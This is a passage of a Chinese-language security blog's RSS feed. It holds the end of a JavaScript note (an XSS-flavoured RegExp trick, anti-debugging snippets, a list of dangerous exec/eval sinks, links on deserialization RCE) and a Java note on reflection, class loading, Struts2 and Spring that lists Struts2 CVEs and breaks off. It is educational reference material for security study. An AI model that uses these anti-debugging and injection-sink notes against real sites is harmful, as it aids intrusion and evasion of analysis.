data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; /xss/a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;p&gt;Node.js 中 child_process.exec 命令调用的是  &lt;code&gt;/bin/sh&lt;/code&gt;  ，故可以直接使用该命令执行 shell&lt;/p&gt;
&lt;h2 id=&#34;反调试技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反调试技巧&#34;&gt;#&lt;/a&gt; 反调试技巧&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;函数重定义  &lt;code&gt;console.log = function(a)&amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;定时断点  &lt;code&gt;setInterval(function()&amp;#123;debugger&amp;#125;, 1000);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;对象拷贝&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对象拷贝&#34;&gt;#&lt;/a&gt; 对象拷贝&lt;/h2&gt;
&lt;p&gt;JavaScript 中的对象拷贝分为浅拷贝和深拷贝。&lt;/p&gt;
&lt;p&gt;浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。&lt;/p&gt;
&lt;p&gt;深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。&lt;/p&gt;
&lt;p&gt;深拷贝可以基于  &lt;code&gt;for-in&lt;/code&gt;  /  &lt;code&gt;object.assign()&lt;/code&gt;  / 拓展运算符  &lt;code&gt;...&lt;/code&gt;  /  &lt;code&gt;JSON.parse(JSON.stringify())&lt;/code&gt;  等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。&lt;/p&gt;
&lt;h2 id=&#34;常见sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见sink&#34;&gt;#&lt;/a&gt; 常见 Sink&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;child_process&lt;/li&gt;
&lt;li&gt;eval&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;execSync&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTYzNTc5Lmh0bWw=&#34;&gt;JavaScript 反调试技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzUuMS8jc2VjLTE1LjMuNC41&#34;&gt;ECMAScript Language Specification&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTgzNzQ2P3NvcnQ9Y3JlYXRlZA==&#34;&gt;js prototype&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Njc2Ntcy9ndWFyZEpzLw==&#34;&gt;javascript 防劫持&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ZleC5iYWlkdS5jb20vYmxvZy8yMDE0LzA2L3hzcy1mcm9udGVuZC1maXJld2FsbC0zLmh0bWw=&#34;&gt;XSS 前端防火墙&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v&#34;&gt;exploiting node js deserialization bug for remote code execution&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4Lw==&#34;&gt;Prototype pollution attack&lt;/span&gt; Content released at NorthSec 2018 on prototype pollution&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/</guid>
            <title>Java</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/</link>
            <category>Java</category>
            <category>语言</category>
            <category>反序列化</category>
            <category>混淆</category>
            <category>沙箱</category>
            <category>类</category>
            <category>JDK</category>
            <pubDate>Sun, 27 Nov 2022 16:50:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;h2 id=&#34;jvm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jvm&#34;&gt;#&lt;/a&gt; JVM&lt;/h2&gt;
&lt;p&gt;JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。&lt;/p&gt;
&lt;p&gt;JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的，且拥有所有的特权。&lt;/p&gt;
&lt;h2 id=&#34;jdk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk&#34;&gt;#&lt;/a&gt; JDK&lt;/h2&gt;
&lt;p&gt;Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。&lt;/p&gt;
&lt;p&gt;在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。&lt;/p&gt;
&lt;h2 id=&#34;jmx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jmx&#34;&gt;#&lt;/a&gt; JMX&lt;/h2&gt;
&lt;p&gt;JMX (Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;jni&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jni&#34;&gt;#&lt;/a&gt; JNI&lt;/h2&gt;
&lt;p&gt;JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。&lt;/p&gt;
&lt;h2 id=&#34;jna&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jna&#34;&gt;#&lt;/a&gt; JNA&lt;/h2&gt;
&lt;p&gt;JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。&lt;/p&gt;
&lt;h2 id=&#34;ognl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ognl&#34;&gt;#&lt;/a&gt; OGNL&lt;/h2&gt;
&lt;p&gt;OGNL (Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。&lt;/p&gt;
&lt;p&gt;Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。&lt;/p&gt;
&lt;h2 id=&#34;io模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#io模型&#34;&gt;#&lt;/a&gt; IO 模型&lt;/h2&gt;
&lt;p&gt;Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。&lt;/p&gt;
&lt;h3 id=&#34;bio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bio&#34;&gt;#&lt;/a&gt; BIO&lt;/h3&gt;
&lt;p&gt;BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。&lt;/p&gt;
&lt;h3 id=&#34;nio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nio&#34;&gt;#&lt;/a&gt; NIO&lt;/h3&gt;
&lt;p&gt;NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。&lt;/p&gt;
&lt;h3 id=&#34;aio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aio&#34;&gt;#&lt;/a&gt; AIO&lt;/h3&gt;
&lt;p&gt;AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。&lt;/p&gt;
&lt;h2 id=&#34;反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射&#34;&gt;#&lt;/a&gt; 反射&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。&lt;/p&gt;
&lt;h3 id=&#34;相关类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关类&#34;&gt;#&lt;/a&gt; 相关类&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类名&lt;/th&gt;
&lt;th&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;类的实体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Field&lt;/td&gt;
&lt;td&gt;类的成员变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;类的方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Constructor&lt;/td&gt;
&lt;td&gt;类的构造方法&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;class相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#class相关&#34;&gt;#&lt;/a&gt; Class 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;asSubclass(Class&amp;lt;U&amp;gt; clazz)
&lt;ul&gt;
&lt;li&gt;把传递的类的对象转换成代表其子类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cast
&lt;ul&gt;
&lt;li&gt;把对象转换成代表类或是接口的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getClassLoader()
&lt;ul&gt;
&lt;li&gt;获得类的加载器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getClasses()
&lt;ul&gt;
&lt;li&gt;返回一个数组，数组中包含该类中所有公共类和接口类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredClasses()
&lt;ul&gt;
&lt;li&gt;返回一个数组，数组中包含该类中所有类和接口类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;forName(String className)
&lt;ul&gt;
&lt;li&gt;根据类名返回类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getName()：
&lt;ul&gt;
&lt;li&gt;获得类的完整路径名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;newInstance()
&lt;ul&gt;
&lt;li&gt;创建类的实例&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getPackage()
&lt;ul&gt;
&lt;li&gt;获得类的包&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getSimpleName()
&lt;ul&gt;
&lt;li&gt;获得类的名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getSuperclass()
&lt;ul&gt;
&lt;li&gt;获得当前类继承的父类的名字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getInterfaces()
&lt;ul&gt;
&lt;li&gt;获得当前类实现的类或是接口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getField(String name)
&lt;ul&gt;
&lt;li&gt;获得某个公有的属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getFields()
&lt;ul&gt;
&lt;li&gt;获得所有公有的属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredField(String name)
&lt;ul&gt;
&lt;li&gt;获得某个属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredFields()
&lt;ul&gt;
&lt;li&gt;获得所有属性对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getAnnotation(Class&amp;lt;A&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;返回该类中与参数类型匹配的公有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getAnnotations()
&lt;ul&gt;
&lt;li&gt;返回该类所有的公有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredAnnotation(Class&amp;lt;A&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;返回该类中与参数类型匹配的所有注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredAnnotations()
&lt;ul&gt;
&lt;li&gt;返回该类所有的注解对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getConstructor(Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类中与参数类型匹配的公有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getConstructors()
&lt;ul&gt;
&lt;li&gt;获得该类的所有公有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredConstructor(Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类中与参数类型匹配的构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredConstructors()
&lt;ul&gt;
&lt;li&gt;获得该类所有构造方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getMethod(String name, Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类某个公有的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getMethods()
&lt;ul&gt;
&lt;li&gt;获得该类所有公有的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredMethod(String name, Class...&amp;lt;?&amp;gt; parameterTypes)
&lt;ul&gt;
&lt;li&gt;获得该类某个方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;getDeclaredMethods()
&lt;ul&gt;
&lt;li&gt;获得该类所有方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnnotation()
&lt;ul&gt;
&lt;li&gt;如果是注解类型则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnnotationPresent(Class&amp;lt;? extends Annotation&amp;gt; annotationClass)
&lt;ul&gt;
&lt;li&gt;如果是指定类型注解类型则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isAnonymousClass()
&lt;ul&gt;
&lt;li&gt;如果是匿名类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isArray()
&lt;ul&gt;
&lt;li&gt;如果是一个数组类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isEnum()
&lt;ul&gt;
&lt;li&gt;如果是枚举类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isInstance(Object obj)
&lt;ul&gt;
&lt;li&gt;如果 obj 是该类的实例则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isInterface()
&lt;ul&gt;
&lt;li&gt;如果是接口类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isLocalClass()
&lt;ul&gt;
&lt;li&gt;如果是局部类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;isMemberClass()
&lt;ul&gt;
&lt;li&gt;如果是内部类则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;field相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#field相关&#34;&gt;#&lt;/a&gt; Field 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;equals(Object obj)
&lt;ul&gt;
&lt;li&gt;属性与 obj 相等则返回 true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;get(Object obj)
&lt;ul&gt;
&lt;li&gt;获得 obj 中对应的属性值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;set(Object obj, Object value)
&lt;ul&gt;
&lt;li&gt;设置 obj 中对应属性值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;method相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#method相关&#34;&gt;#&lt;/a&gt; Method 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;invoke(Object obj, Object... args)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;传递 object 对象及参数调用该对象对应的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;constructor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#constructor&#34;&gt;#&lt;/a&gt; Constructor&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;newInstance(Object... initargs)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据传递的参数创建类的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类&#34;&gt;#&lt;/a&gt; 类&lt;/h1&gt;
&lt;h2 id=&#34;生命周期&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生命周期&#34;&gt;#&lt;/a&gt; 生命周期&lt;/h2&gt;
&lt;p&gt;整体来说，Java 中类的生命周期如下：加载 (Loading) -&amp;gt; [ 连接 (Linking) : 验证 (Verification) -&amp;gt; 准备 (Perparation) -&amp;gt; 解析 (Resolutin) ] -&amp;gt; 初始化 (Initialization) -&amp;gt; 使用 (Using) -&amp;gt; 卸载 (Unloading) 。&lt;/p&gt;
&lt;p&gt;加载过程分为三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过全限定类名来获取定义此类的二进制字节流&lt;/li&gt;
&lt;li&gt;将字节流所代表的静态存储结构转化为方法区的运行时数据结构&lt;/li&gt;
&lt;li&gt;在内存中生成代表这个类的  &lt;code&gt;java.lang.Class&lt;/code&gt;  对象，作为方法区这个类的各种数据的访问入口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断文件格式：是否以  &lt;code&gt;0xCAFEBABE&lt;/code&gt;  开始，主次版本号是否在处理范围内&lt;/li&gt;
&lt;li&gt;元数据验证&lt;/li&gt;
&lt;li&gt;字节码验证&lt;/li&gt;
&lt;li&gt;符号引用验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;部分运行选项与说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分运行选项与说明&#34;&gt;#&lt;/a&gt; 部分运行选项与说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-Xverify:none&lt;/code&gt;  关闭类加载时的验证措施&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架&#34;&gt;#&lt;/a&gt; 框架&lt;/h1&gt;
&lt;h2 id=&#34;servlet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#servlet&#34;&gt;#&lt;/a&gt; Servlet&lt;/h2&gt;
&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Servlet (Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。&lt;/p&gt;
&lt;p&gt;狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。&lt;/p&gt;
&lt;h3 id=&#34;生命周期为&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生命周期为&#34;&gt;#&lt;/a&gt; 生命周期为&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;客户端请求该 Servlet&lt;/li&gt;
&lt;li&gt;加载 Servlet 类到内存&lt;/li&gt;
&lt;li&gt;实例化并调用 init () 方法初始化该 Servlet&lt;/li&gt;
&lt;li&gt;service ()(根据请求方法不同调用  &lt;code&gt;doGet()&lt;/code&gt;  /  &lt;code&gt;doPost()&lt;/code&gt;  / ... /  &lt;code&gt;destroy()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;接口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接口&#34;&gt;#&lt;/a&gt; 接口&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;init()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 Servlet 的生命期中，仅执行一次 init () 方法，在服务器装入 Servlet 时执行。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;service () 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的  &lt;code&gt;service()&lt;/code&gt;  方法就要被调用，而且传递给这个方法一个 &amp;quot;请求&amp;quot;(ServletRequest) 对象和一个 &amp;quot;响应&amp;quot;(ServletResponse) 对象作为参数。&lt;/p&gt;
&lt;h2 id=&#34;struts-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#struts-2&#34;&gt;#&lt;/a&gt; Struts 2&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。&lt;/p&gt;
&lt;h3 id=&#34;请求流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求流程&#34;&gt;#&lt;/a&gt; 请求流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送请求的 tomcat 服务器&lt;/li&gt;
&lt;li&gt;请求经过一系列过滤器&lt;/li&gt;
&lt;li&gt;FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action&lt;/li&gt;
&lt;li&gt;ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy&lt;/li&gt;
&lt;li&gt;ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类&lt;/li&gt;
&lt;li&gt;ActionProxy 创建一个 ActionInvocation 对象&lt;/li&gt;
&lt;li&gt;ActionInvocation 对象回调 Action 的 execute 方法&lt;/li&gt;
&lt;li&gt;Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2016-3081 (S2-032)&lt;/li&gt;
&lt;li&gt;CVE-2016-3687 (S2-033)&lt;/li&gt;
&lt;li&gt;CVE-2016-4438 (S2-037)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ltbXVuaW8vYXBhY2hlLXN0cnV0czItQ1ZFLTIwMTctNTYzOA==&#34;&gt;CVE-2017-5638&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;CVE-2017-7672&lt;/li&gt;
&lt;li&gt;CVE-2017-9787&lt;/li&gt;
&lt;li&gt;CVE-2017-9793&lt;/li&gt;
&lt;li&gt;CVE-2017-9804&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd25fQ1ZFLTIwMTctOTgwNQ==&#34;&gt;CVE-2017-9805&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyaWFud3JmL1MyLTA1My1DVkUtMjAxNy0xMjYxMQ==&#34;&gt;CVE-2017-12611&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;CVE-2017-15707&lt;/li&gt;
&lt;li&gt;CVE-2018-1327&lt;/li&gt;
&lt;li&gt;CVE-2018-11776&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;spring&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring&#34;&gt;#&lt;/a&gt; Spring&lt;/h2&gt;
&lt;h3 id=&#34;简介-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-4&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。&lt;/p&gt;
&lt;h3 id=&#34;spring-mvc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-mvc&#34;&gt;#&lt;/a&gt; Spring MVC&lt;/h3&gt;
&lt;p&gt;Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。&lt;/p&gt;
&lt;h3 id=&#34;spring-boot&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-boot&#34;&gt;#&lt;/a&gt; Spring Boot&lt;/h3&gt;
&lt;p&gt;Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。&lt;/p&gt;
&lt;h3 id=&#34;请求流程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求流程-2&#34;&gt;#&lt;/a&gt; 请求流程&lt;/h3&gt;
&lt;ul&gt;
